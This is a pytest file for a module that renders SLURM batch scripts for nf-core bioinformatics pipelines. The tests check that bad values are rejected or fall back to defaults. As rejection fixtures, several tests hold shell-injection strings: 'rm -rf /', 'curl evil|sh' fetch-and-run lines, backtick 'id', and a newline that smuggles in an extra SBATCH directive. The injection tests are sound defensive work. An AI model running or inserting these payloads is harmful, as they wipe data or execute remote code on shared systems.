import pytest

from chat_nextseek.luria.run_script import (
    validate_resources,
    sanitize_job_name,
    render_run_script,
)


def test_validate_resources_defaults_when_empty():
    assert validate_resources({}) == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_validate_resources_accepts_valid_overrides():
    out = validate_resources({"partition": "high", "time": "12:00:00", "cpus": 8, "mem": "64G"})
    assert out == {"partition": "high", "time": "12:00:00", "cpus": "8", "mem": "64G"}


def test_validate_resources_rejects_bad_values_falls_back():
    out = validate_resources({"partition": "bad; rm -rf /", "time": "lots", "cpus": 999, "mem": "8GB"})
    assert out == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_validate_resources_rejects_trailing_newline():
    out = validate_resources({"partition": "bcc\n", "time": "12:00:00\n", "mem": "64G\n"})
    assert out == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_validate_resources_non_dict_falls_back():
    assert validate_resources(["not", "a", "dict"]) == {"partition": "bcc", "time": "48:00:00", "cpus": "16", "mem": "8G"}


def test_sanitize_job_name_strips_shell_chars():
    assert sanitize_job_name("rnaseq; rm -rf /") == "rnaseq_rm_-rf"
    assert sanitize_job_name("") == "nfcore_run"


def test_render_substitutes_all_slots_and_no_tokens_left():
    script = render_run_script(
        job_name="nfcore_rnaseq", pipeline="nf-core/rnaseq", revision="3.16.1",
        run_dir="/net/x/runs/nfcore_rnaseq_260709", genome="GRCm39",
        work_dir="/net/x/work/nfcore_rnaseq", singularity_cache="/net/x/singularity_cache",
        resources={},
    )
    assert "#SBATCH --job-name=nfcore_rnaseq" in script
    assert "#SBATCH -n 16" in script                      # default cpus
    assert "#SBATCH -p bcc" in script                     # default partition (not the busy 'normal')
    assert "#SBATCH --output=/net/x/runs/nfcore_rnaseq_260709/nfcore_rnaseq.out" in script
    assert "conda activate cdemu_nfcore" in script        # default; LURIA_CONDA_ENV overrides
    assert "module add singularity/3.10.4" in script
    assert "cd /net/x/runs/nfcore_rnaseq_260709" in script
    assert "nextflow run nf-core/rnaseq -r 3.16.1 -profile singularity" in script
    assert "-c luria.config" in script                    # local reference genomes
    assert "-params-file params.yml" in script            # curated per-pipeline params
    assert "--input samplesheet.csv" in script
    assert "--genome GRCm39" in script          # threaded, not hardcoded
    assert "-w /net/x/work/nfcore_rnaseq" in script
    assert "export NXF_SINGULARITY_CACHEDIR=/net/x/singularity_cache" in script
    assert "export NXF_SYNTAX_PARSER=v1" in script        # legacy parser for nf-core configs
    # CA bundle for singularity TLS (compute nodes lack the Let's Encrypt root)
    assert 'export SSL_CERT_FILE="$(dirname /net/x/singularity_cache)/certs/ca-bundle.crt"' in script
    assert "{{" not in script and "}}" not in script


def test_validate_revision_accepts_normal_revisions():
    from chat_nextseek.luria.run_script import validate_revision
    for r in ("3.21.0", "main", "a1b2c3d", "dev/branch-1"):
        assert validate_revision(r) == r


def test_validate_revision_rejects_shell_metacharacters():
    from chat_nextseek.luria.run_script import validate_revision
    for bad in ("x; rm -rf /", "main | sh", "v1 -c /tmp/e.config", "a\nb", "`id`"):
        with pytest.raises(ValueError):
            validate_revision(bad)


def test_render_run_script_rejects_injected_revision():
    with pytest.raises(ValueError):
        render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="x; curl evil|sh",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="GRCh38", resources={})


def test_validate_genome_accepts_igenomes_keys():
    from chat_nextseek.luria.run_script import validate_genome
    for g in ("GRCh38", "GRCm39", "R64-1-1", "WBcel235", "Mmul_10"):
        assert validate_genome(g) == g


def test_validate_genome_rejects_injection():
    from chat_nextseek.luria.run_script import validate_genome
    for bad in ("GRCh38; rm -rf /", "x`id`", "a b", "", "g\n"):
        with pytest.raises(ValueError):
            validate_genome(bad)


def test_render_run_script_rejects_injected_genome():
    with pytest.raises(ValueError):
        render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c",
                          genome="GRCh38; curl evil|sh", resources={})


def test_render_luria_config_substitutes_refs_root():
    from chat_nextseek.luria.run_script import render_luria_config
    cfg = render_luria_config("/net/bmc-pub10/data1/bmc/pipeline_cd/refs")
    assert "{{REFS_ROOT}}" not in cfg
    # every genome key resolves to a local file under the refs root
    assert "/net/bmc-pub10/data1/bmc/pipeline_cd/refs/GRCh38.primary_assembly.genome.fa.gz" in cfg
    assert "/net/bmc-pub10/data1/bmc/pipeline_cd/refs/gencode.vM39.basic.annotation.gtf.gz" in cfg
    assert "'Mfas6.0'" in cfg and "'Mmul_10'" in cfg


def test_render_luria_config_strips_trailing_slash():
    from chat_nextseek.luria.run_script import render_luria_config
    cfg = render_luria_config("/net/x/refs/")
    assert "/net/x/refs/GRCh38.primary_assembly.genome.fa.gz" in cfg
    assert "/net/x/refs//GRCh38" not in cfg


def test_render_luria_config_rejects_bad_refs_root():
    from chat_nextseek.luria.run_script import render_luria_config
    for bad in ("", "/net/x; rm -rf /", "a b", "x`id`"):
        with pytest.raises(ValueError):
            render_luria_config(bad)


def test_render_run_script_injects_fasta_gtf_for_known_genome():
    s = render_run_script(job_name="j", pipeline="nf-core/scrnaseq", revision="2.7.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="Mfas6.0",
                          resources={}, refs_root="/net/x/refs")
    assert "--fasta /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.dna.toplevel.fa.gz" in s
    assert "--gtf /net/x/refs/Macaca_fascicularis.Macaca_fascicularis_6.0.116.gtf.gz" in s
    assert "--genome Mfas6.0" in s   # kept alongside the explicit paths
    assert "{{" not in s and "}}" not in s


def test_render_run_script_no_fasta_gtf_for_unregistered_genome():
    # a genome not in LURIA_GENOMES has no local refs -> no --fasta/--gtf (falls back to --genome)
    s = render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="R64-1-1",
                          resources={}, refs_root="/net/x/refs")
    assert "--fasta" not in s and "--gtf" not in s
    assert "--genome R64-1-1" in s and "{{" not in s


def test_genome_ref_paths():
    from chat_nextseek.luria.run_script import genome_ref_paths
    f, g = genome_ref_paths("GRCm39", "/net/x/refs/")
    assert f == "/net/x/refs/GRCm39.primary_assembly.genome.fa.gz"
    assert g == "/net/x/refs/gencode.vM39.basic.annotation.gtf.gz"
    assert genome_ref_paths("NOPE", "/net/x/refs") == (None, None)


def test_render_process_config():
    from chat_nextseek.luria.run_script import render_process_config
    cfg = render_process_config({"SIMPLEAF_QUANT": "--knee"})
    assert "withName: '.*:SIMPLEAF_QUANT'" in cfg and "ext.args = '--knee'" in cfg
    assert render_process_config({}) == "" and render_process_config(None) == ""
    with pytest.raises(ValueError):
        render_process_config({"BAD; rm -rf /": "--knee"})            # unsafe process name
    with pytest.raises(ValueError):
        render_process_config({"SIMPLEAF_QUANT": "--knee'; rm -rf /"})  # unsafe ext.args
    with pytest.raises(ValueError):
        # STAR_ALIGN has a non-empty pipeline ext.args default -> overriding would clobber it;
        # the renderer refuses (STAR cell-calling is tuned via samplesheet expected_cells, not here).
        render_process_config({"STAR_ALIGN": "--soloCellFilter EmptyDrops_CR"})


# --- Phase 2: per-aligner vendored-pipeline source selection ---

def test_resolve_pipeline_source_star_uses_vendored_clone_no_revision():
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    source, flag = resolve_pipeline_source(
        "nf-core/scrnaseq", "star", "2.7.1", "/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert source == "/net/bmc-pub10/data1/bmc/pipeline_cd/pipelines/scrnaseq-2.7.1-star-patched"
    # a `-r <tag>` on a local git clone would checkout the tag and WIPE the patches
    assert flag == ""


def test_resolve_pipeline_source_stock_when_aligner_not_registered():
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    source, flag = resolve_pipeline_source(
        "nf-core/scrnaseq", "alevin", "2.7.1", "/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert source == "nf-core/scrnaseq"
    assert flag == "-r 2.7.1"


def test_resolve_pipeline_source_normalizes_github_url():
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    for pipeline in ("https://github.com/nf-core/scrnaseq", "https://github.com/nf-core/scrnaseq.git"):
        source, flag = resolve_pipeline_source(pipeline, "star", "2.7.1", "/net/x")
        assert source == "/net/x/pipelines/scrnaseq-2.7.1-star-patched"
        assert flag == ""


def test_resolve_pipeline_source_stock_when_no_working():
    # without a working path we cannot build the clone path -> fall back to stock
    from chat_nextseek.luria.run_script import resolve_pipeline_source
    source, flag = resolve_pipeline_source("nf-core/scrnaseq", "star", "2.7.1", None)
    assert source == "nf-core/scrnaseq" and flag == "-r 2.7.1"


def test_render_run_script_star_points_at_vendored_clone_no_r():
    s = render_run_script(job_name="j", pipeline="nf-core/scrnaseq", revision="2.7.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="Mfas6.0",
                          resources={}, refs_root="/net/x/refs", aligner="star",
                          working="/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert ("nextflow run /net/bmc-pub10/data1/bmc/pipeline_cd/pipelines/scrnaseq-2.7.1-star-patched "
            "-profile singularity") in s
    assert "-r 2.7.1" not in s          # local clone: NO -r (would wipe the patches)
    assert "{{" not in s and "}}" not in s


def test_render_run_script_alevin_uses_stock_remote_with_r():
    s = render_run_script(job_name="j", pipeline="nf-core/scrnaseq", revision="2.7.1",
                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="Mfas6.0",
                          resources={}, refs_root="/net/x/refs", aligner="alevin",
                          working="/net/bmc-pub10/data1/bmc/pipeline_cd")
    assert "nextflow run nf-core/scrnaseq -r 2.7.1 -profile singularity" in s
    assert "/pipelines/scrnaseq-2.7.1-star-patched" not in s


# --- operator-specific slots (mail user / conda env) -------------------------
# Both were hardcoded to one operator's values in the template; they are now
# env-driven and allow-listed fail-closed like every other slot.

def _script(**over):
    kwargs = dict(
        job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
        run_dir="/net/x/runs/j", genome="GRCm39",
        work_dir="/net/x/work/j", singularity_cache="/net/x/cache",
        resources={},
    )
    kwargs.update(over)
    return render_run_script(**kwargs)


def test_mail_directives_omitted_when_unset(monkeypatch):
    """No LURIA_MAIL_USER -> no mail directives at all.

    Defaulting this would mail another operator's runs to whoever was hardcoded.
    """
    monkeypatch.delenv("LURIA_MAIL_USER", raising=False)
    script = _script()
    assert "--mail-user" not in script
    assert "--mail-type" not in script


def test_mail_directives_rendered_when_set(monkeypatch):
    monkeypatch.setenv("LURIA_MAIL_USER", "someone@mit.edu")
    script = _script()
    assert "#SBATCH --mail-type=END" in script
    assert "#SBATCH --mail-user=someone@mit.edu" in script


def test_mail_user_is_allow_listed(monkeypatch):
    monkeypatch.setenv("LURIA_MAIL_USER", "evil@x.edu\n#SBATCH --wckey=pwn")
    with pytest.raises(ValueError):
        _script()


def test_conda_env_overridable(monkeypatch):
    monkeypatch.setenv("LURIA_CONDA_ENV", "other_nfcore")
    script = _script()
    assert "conda activate other_nfcore" in script
    assert "cdemu_nfcore" not in script


def test_conda_env_is_allow_listed(monkeypatch):
    monkeypatch.setenv("LURIA_CONDA_ENV", "x; rm -rf /")
    with pytest.raises(ValueError):
        _script()


from chat_nextseek.luria.run_script import has_local_luria_ref, local_luria_ref_files


def test_has_local_luria_ref_true_for_registered_keys():
    for key in ("GRCh38", "GRCm39", "Mfas6.0", "Mmul_10"):
        assert has_local_luria_ref(key) is True


def test_has_local_luria_ref_false_for_unregistered_or_none():
    assert has_local_luria_ref("GRCz11") is False
    assert has_local_luria_ref(None) is False
    assert has_local_luria_ref("") is False


def test_local_luria_ref_files_returns_filenames_or_none():
    files = local_luria_ref_files("Mfas6.0")
    assert files["fasta"].endswith(".fa.gz") and files["gtf"].endswith(".gtf.gz")
    assert local_luria_ref_files("GRCz11") is None


# --- Task 7: fetchngs pre-block rendered into run.sh --------------------------

def _render(**over):
    kw = dict(job_name="j", pipeline="nf-core/rnaseq", revision="3.18.0",
              run_dir="/w/runs/j", work_dir="/w/work/j", singularity_cache="/w/sc",
              genome="GRCm39", resources=None, refs_root="/w/refs")
    kw.update(over)
    return render_run_script(**kw)


def test_render_no_fetch_block_by_default():
    out = _render()
    assert "fetchngs" not in out
    assert "nextflow run nf-core/rnaseq -r 3.18.0" in out   # pipeline block intact


def test_render_includes_fetch_block_when_needed():
    out = _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0")
    assert "nextflow run nf-core/fetchngs -r 1.12.0" in out
    assert "fetchngs_helpers.py ids" in out
    assert "fetchngs_helpers.py fill" in out
    assert "/w/fastq_cache" in out
    assert "nextflow run nf-core/rnaseq -r 3.18.0" in out   # pipeline block STILL intact + unchanged


def test_render_fetch_block_binds_etc_for_container_dns():
    # The fetchngs wget container has no /etc/resolv.conf; bind host /etc so it can resolve ENA.
    out = _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0")
    assert "SINGULARITY_BIND=/etc nextflow run nf-core/fetchngs" in out


def test_render_fetch_block_fails_fast_on_fetch_or_fill_error():
    # A failed download or fill must abort run.sh, not fall through to a doomed pipeline run.
    out = _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0")
    assert out.count("exit 1") >= 2                       # guards on both the fetch and the fill
    assert 'fastq/*"${acc}"*.fastq.gz' in out             # substring pre-glob matches <exp>_<run>_*


def test_render_fetch_block_rejects_bad_cache():
    with pytest.raises(ValueError):
        _render(needs_fetch=True, fastq_cache="/w; rm -rf /", fetchngs_revision="1.12.0")


def test_render_fetch_block_rejects_bad_revision():
    with pytest.raises(ValueError):
        _render(needs_fetch=True, fastq_cache="/w/fastq_cache", fetchngs_revision="1.12.0; evil")
